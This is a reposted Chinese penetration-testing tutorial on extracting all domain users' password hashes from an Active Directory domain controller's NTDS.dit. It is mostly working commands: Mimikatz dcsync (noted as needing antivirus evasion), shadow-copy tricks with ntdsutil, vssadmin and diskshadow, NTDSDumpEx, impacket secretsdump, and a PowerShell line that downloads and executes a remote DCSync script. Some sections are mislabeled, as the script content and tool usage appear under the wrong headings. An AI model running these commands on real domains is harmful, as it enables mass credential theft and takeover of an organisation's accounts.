> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ALgLRtvfud_D4Dvi72k50A)

> **转自** **HACK 之道**

在拥有域管权限时，可以提取所有域用户的密码 Hash，为下一步渗透做准备。  

一、如何 Dump Hash
--------------

Hash 值存储在域控制器中（C:\Windows\NTDS\NTDS.DIT）  
`NTDS.DIT` 文件经常被操作系统使用，无法直接复制到其它位置。可尝试以下方法 Dump Hash。

### 1. Mimikatz

Mimikatz 有一个功能（dcsync），它利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码 Hash 值。

需要权限：域管权限  
Mimikatz 需免杀

```
# 所有用户
Mimikatz "lsadump::dcsync /domain:test.com /all /csv" exit > hash.txt

# 指定用户
Mimikatz "lsadump::dcsync /domain:test.com /user:username" exit > hash.txt
```

### 2. Ntdsutil

Ntdsutil 域控制器默认安装，使管理员能访问和管理 Windows Active Directory 数据库。渗透测试中可以用它来拍摄 ntds.dit 文件的快照

需要权限：域管权限  

```
# 查询当前系统的快照
vssadmin list shadows

# 创建快照
vssadmin create shadow /for=c: /autoretry=10
"Shadow Copy Volume Name" 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
"Shadow Copy ID" 为 {aa488f5b-40c7-4044-b24f-16fd041a6de2}

# 复制 ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit

# 删除快照
vssadmin delete shadows /for=c: /quiet
```

### 3. Vssadmin

域控制器默认安装

需要权限：域管权限

```
# 查看存放 `ntds.dit` 的逻辑驱动器（一般为 C 盘）
# 找出系统没有使用的逻辑驱动器号
wmic logicaldisk

# 调用脚本
C:\windows\system32\diskshadow.exe /s C:\shadow.txt
```

### 4. Diskshadow

`DiskShadow` 是由微软官方签名的，Windows Server 2008、2012、2016 都包含了 DiskShadow，所在目录`C:\windows\system32\diskshadow.exe`。包含`交互式命令`和`脚本模式`。

下面利用脚本模式提取 AD 数据库

```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "C:\windows\system32\cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\ntds.dit
delete shadows volume %someAlias%
reset
```

shadow.txt 内容  

```
# 远程加载 Invoke-DCSync.ps1
powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-DCSync.ps1')";Invoke-DCSync -PWDumpFormat > hash.txt
```

### 5. Powershell

项目地址：https://github.com/EmpireProject/Empire

```
usage: ntdsdumpex.exe <-d ntds.dit> <-k HEX-SYS-KEY | -s system.hiv |-r> [-o out.txt] [-h] [-m] [-p] [-u]
-d    path of ntds.dit database
-k    use specified SYSKEY
-s    parse SYSKEY from specified system.hiv
-r    read SYSKEY from registry
-o    write output into
-h    dump hash histories(if available)
-p    dump description and path of home directory
-m    dump machine accounts
-u    USE UPPER-CASE-HEX
```

二、如何从 ntds.dit 提取 Hash  

### 1. NTDSDumpEx

```
# 离线模式：先导出注册表
reg save hklm\system system.hiv
NTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt
```

```
# 在线模式：无需导出注册表
NTDSDumpEx.exe -d ntds.dit -r -o hash.txt
```

```
git clone https://github.com/SecureAuthCorp/impacket
```

### 2. Impacket

项目地址：https://github.com/SecureAuthCorp/impacket

因为 Kali 的 python 环境安装得比较全，所以使用 Kali 来解 Hash

```
# 安装所需库 
pip install .
python setup.py
```

```
# 使用 secretsdump.py 解 Hash
/impacket/examples# python secretsdump.py -ntds /home/workspace/hash/ntds.dit -system /home/workspace/hash/sys.hiv LOCAL > /home/workspace/hash/hash.txt
```

```
# 使用 secretsdump.py 解 Hash
/impacket/examples# python secretsdump.py -ntds /home/workspace/hash/ntds.dit -system /home/workspace/hash/sys.hiv LOCAL > /home/workspace/hash/hash.txt
```

三、总结
----

1.  Mimikatz 在域用户机器执行需要域管权限时，可使用 `psexec`、`计划任务`等远程执行
    
2.  使用 `Ntdsutil`、`Vssadmin` 等卷影拷贝工具时，需要先开启 `Volume Shadow Copy Service` 服务
    
3.  有时遇到 `NTDSDumpEx` 提取出错，可以尝试修复 ntds.dit，修复后还无法提取，则使用 `secretsdump.py`。缺点：比较耗时
    

四、参考文章
------

Dump 域内用户 Hash 姿势集合  
域渗透——获得域控服务器的 NTDS.dit 文件  
NTDS.dit 密码快速提取工具

作者：scarletf，来源：https://scarletf.github.io/  

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**